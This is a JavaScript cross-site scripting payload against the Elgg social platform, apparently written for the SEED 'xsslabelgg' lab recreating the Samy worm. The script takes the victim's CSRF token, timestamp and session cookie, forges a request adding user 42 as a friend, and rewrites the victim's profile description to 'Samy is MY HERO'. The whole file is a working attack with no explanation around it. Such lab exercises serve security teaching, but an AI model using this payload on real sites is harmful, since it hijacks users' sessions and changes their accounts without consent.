alert('welcome');

var Ajax=null;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=42"+token+ts;

Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection", "keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();

Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection", "keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

var userName=elgg.session.user.name;
var desc="&description=Samy+is+MY+HERO";
var name="&name="+userName;
var guid="&guid="+elgg.session.user.guid;
var content=token+ts+name+desc+guid;

alert(content);
Ajax.send(content);
